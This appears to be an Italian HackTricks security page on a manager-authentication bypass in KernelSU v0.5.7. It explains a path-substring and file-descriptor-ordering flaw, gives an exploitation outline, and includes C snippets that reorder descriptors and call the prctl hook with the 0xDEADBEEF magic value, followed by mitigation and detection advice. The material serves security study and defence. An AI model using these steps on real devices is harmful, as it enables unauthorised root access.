# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Framework di rooting come KernelSU, APatch e SKRoot applicano patch o eseguono hook sul kernel Android/Linux ed espongono funzionalità privilegiate a un’app manager userspace non privilegiata. Magisk viene trattato separatamente di seguito perché CVE-2024-48336 riguardava il caricamento di codice lato manager, non questo percorso syscall di KernelSU.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Questa pagina astrae le tecniche e le criticità individuate nella ricerca pubblica (in particolare l’analisi di Zimperium su KernelSU v0.5.7) per aiutare i team red e blue a comprendere le superfici di attacco, le primitive di exploitation e le mitigazioni robuste.<sup>[[1]](#references)</sup>

---
## Pattern architetturale: canale manager con syscall hookata

- In KernelSU v0.5.7, un hook del kernel su `prctl` riceve da userspace un valore magico, un ID comando e argomenti specifici del comando.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Il chiamante richiede innanzitutto lo stato del manager con `CMD_BECOME_MANAGER`. L’autorizzazione è specifica per comando: `CMD_GRANT_ROOT` verifica lo stato del manager/allowlist, `CMD_ALLOW_SU` è riservato al manager e `CMD_SET_SEPOLICY` richiede root in questa versione.<sup>[[2]](#references)[[11]](#references)</sup>
- Altri comandi interrogano la versione/configurazione o segnalano eventi del framework.<sup>[[2]](#references)</sup>
- Poiché qualsiasi app può invocare questa syscall interface, la correttezza dell’autenticazione del manager è critica.<sup>[[1]](#references)[[2]](#references)</sup>

Esempio (design di KernelSU):
- Syscall con hook: prctl
- Valore magico per deviare verso l’handler di KernelSU: 0xDEADBEEF
- I comandi includono: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, ecc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## Flusso di autenticazione di KernelSU v0.5.7 (come implementato)

Quando userspace chiama prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU verifica:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Verifica del prefisso del path
- Il path fornito deve iniziare con un prefisso previsto per l’UID del chiamante, ad esempio /data/data/<pkg> o /data/user/<id>/<pkg>.
- Riferimento: logica del prefisso del path in core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Verifica della proprietà
- Il path deve essere di proprietà dell’UID del chiamante.
- Riferimento: logica della proprietà in core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Verifica della firma dell’APK tramite scansione della tabella FD
- Iterare sui file descriptor aperti del processo chiamante in ordine crescente.
- Per ogni file regolare il cui path inizi con `/data/app/` e termini con `/base.apk`, richiedere che il path contenga la substring del package derivata dal data-directory path fornito.
- Verificare la firma del primo candidato che supera questi controlli sul path.
- Analizzare la firma APK v2 e verificarla rispetto al certificato ufficiale del manager.
- Riferimenti: manager.c (iterazione degli FD), apk_sign.c (verifica APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Se tutti i controlli hanno esito positivo, il kernel memorizza temporaneamente l’UID del manager; i comandi riservati al manager accettano quindi quell’UID, mentre gli altri comandi mantengono il proprio UID o i propri controlli sull’allowlist.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Classe di vulnerabilità: selezione dell’APK basata sul path considerato attendibile

KernelSU v0.5.7 non associa il risultato della firma all’identità del package installato secondo PackageManager. In `manager.c`, il controllo del package consiste solo in una verifica della substring del path (`strstr(cwd, pkg)`); il primo candidato che supera tale controllo viene quindi sottoposto alla verifica della firma. Un attacker può pertanto collocare un APK manager autentico sotto un path `/data/app/` che contenga anche il nome del package dell’attacker e fare in modo che venga selezionato per primo.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Questo trust-by-indirection consente a un’app non privilegiata di impersonare il manager senza possedere la signing key del manager.<sup>[[1]](#references)</sup>

Proprietà chiave sfruttate:<sup>[[1]](#references)[[3]](#references)</sup>
- La scansione degli FD è ordinata per indice del descriptor e il controllo del package è una verifica della substring del path, non un’associazione verificata tra package e identità dell’APK.
- open() restituisce l’FD disponibile con il numero più basso. Chiudendo prima gli FD con numero inferiore, un attacker può controllare l’ordine.
- Un APK manager incluso nell’app può essere collocato sotto `/data/app/` in un path contenente la stringa del package dell’attacker, mantenendo al contempo la firma ufficiale del manager.

---
## Prerequisiti dell’attacco

Il caso concreto di KernelSU v0.5.7 richiede:<sup>[[1]](#references)[[3]](#references)</sup>

- Il device è già rooted con un framework di rooting vulnerabile (ad esempio KernelSU v0.5.7).
- L’attacker può eseguire localmente codice arbitrario non privilegiato (processo di un’app Android).
- Nell’implementazione v0.5.7, `current->real_parent` deve avere UID 0 (il commento nel source lo descrive come requisito di figlio diretto di zygote); `manager.c` rifiuta gli altri parent.<sup>[[3]](#references)</sup>
- Il manager reale non si è ancora autenticato (ad esempio subito dopo un reboot). Alcuni framework memorizzano l’UID del manager dopo il successo; è necessario vincere la race.<sup>[[1]](#references)</sup>

---
## Schema dell’exploitation (KernelSU v0.5.7)

Passaggi high-level (il video demo citato mostra la proof of concept pubblica in funzione):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Costruire un path valido verso la directory dei dati della propria app per superare i controlli del prefisso e della proprietà.
2) Collocare un base.apk autentico di KernelSU Manager sotto `/data/app/` in un path contenente la stringa del proprio package, quindi aprirlo su un FD con numero inferiore rispetto al proprio base.apk.
3) Invocare prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) per superare i controlli.
4) Usare `CMD_GRANT_ROOT`, quindi `CMD_ALLOW_SU` per ottenere un su persistente; invocare `CMD_SET_SEPOLICY`, riservato a root, solo dopo aver ottenuto root e soltanto dove supportato.

Note pratiche sul passaggio 2 (ordine degli FD):<sup>[[1]](#references)</sup>
- Identificare l’FD del processo relativo al proprio /data/app/*/base.apk esaminando i symlink di /proc/self/fd.
- Chiudere un FD basso (ad esempio stdin, fd 0) e aprire per primo l’APK manager legittimo, in modo che occupi fd 0 (o qualsiasi indice inferiore all’FD del proprio base.apk).
- Includere l’APK manager legittimo nella propria app, in modo che il suo path inizi con `/data/app/`, termini con `/base.apk` e contenga la stringa del proprio package. Ad esempio, un path nella directory `lib` della propria app può soddisfare questi controlli.<sup>[[1]](#references)[[3]](#references)</sup>

Snippet di codice d’esempio (Android/Linux, solo illustrativi):

Enumerare gli FD aperti per individuare le entry base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Forza un FD con numero inferiore a puntare all'APK legittimo del manager:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autenticazione del Manager tramite l'hook `prctl` di KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Dopo il successo, comandi privilegiati (esempi):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promuove il processo corrente a root
- CMD_ALLOW_SU: aggiunge il tuo package/UID all'allowlist per un su persistente
- CMD_SET_SEPOLICY: modifica la policy SELinux dopo aver ottenuto root; KernelSU v0.5.7 verifica la presenza dell'UID 0 per questo comando.<sup>[[2]](#references)</sup>

Suggerimento per race/persistence:
- Registra un receiver BOOT_COMPLETED nell'AndroidManifest (`RECEIVE_BOOT_COMPLETED`) per avviarlo dopo il reboot e tentare l'autenticazione prima del manager reale; il permesso autorizza la ricezione di `ACTION_BOOT_COMPLETED`, ma non garantisce di per sé la priorità di scheduling.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Indicazioni per il rilevamento e la mitigazione

Per gli sviluppatori dei framework:
- Associa l'autenticazione al package/UID del chiamante, non a FD arbitrari:
- Risolvi il package del chiamante dal suo UID e verifica la corrispondenza con la signature del package installato (tramite PackageManager), invece di eseguire la scansione degli FD.
- Se operi solo a livello kernel, usa un'identità stabile del chiamante (task creds) e valida tramite una source of truth stabile gestita da init/helper in userspace, non tramite FD di processo.
- Evita i controlli sui path-prefix come identità; il chiamante può soddisfarli banalmente.
- Usa una challenge–response basata su nonce sul canale e cancella qualsiasi identità del manager memorizzata nella cache al boot o in occasione di eventi chiave.
- Valuta l'uso di IPC autenticato basato su binder invece di sovraccaricare i syscall generici, quando possibile.

Per i defender/blue team:
- Rileva la presenza di rooting frameworks e dei processi manager; monitora le chiamate prctl con magic constants sospette (ad esempio 0xDEADBEEF) se disponi di telemetria del kernel.<sup>[[1]](#references)[[11]](#references)</sup>
- Nei fleet gestiti, blocca o genera alert per i boot receiver provenienti da package non attendibili che tentano rapidamente comandi privilegiati del manager dopo il boot.
- Assicurati che i device siano aggiornati a versioni patched del framework; invalida gli ID del manager memorizzati nella cache durante l'update.

Limitazioni dell'attacco:<sup>[[1]](#references)[[2]](#references)</sup>
- Colpisce solo device già rooted con un framework vulnerabile.
- In genere richiede un reboot/race window prima che il manager legittimo esegua l'autenticazione (alcuni framework memorizzano nella cache l'UID del manager fino al reset).

---
## Note correlate tra i framework

- L'autenticazione basata su password (ad esempio, nelle build storiche di APatch/SKRoot) può essere debole se le password sono indovinabili o soggette a bruteforce, oppure se le validazioni contengono bug.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- L'autenticazione basata su package/signature (ad esempio, KernelSU) è in linea di principio più robusta, ma deve associarsi al chiamante effettivo, non ad artefatti derivati dal path e selezionati tramite scansioni degli FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 ha interessato le build precedenti alla Canary 27007 che caricavano codice da un package GMS non verificato, consentendo a un'app locale di eseguire codice nell'app Magisk e ottenere un'escalation a root senza interazione dell'utente.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Il rooting di ogni male: falle di sicurezza che potrebbero compromettere il tuo device mobile](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – controlli di autenticazione in core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iterazione degli FD, controllo del package e chiamata della signature in manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – verifica APK v2 in apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Progetto KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Problema Magisk #8279 – verifica che GMS sia un'app di sistema](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Video dimostrativo della PoC di KSU (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identificatori dei comandi in ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
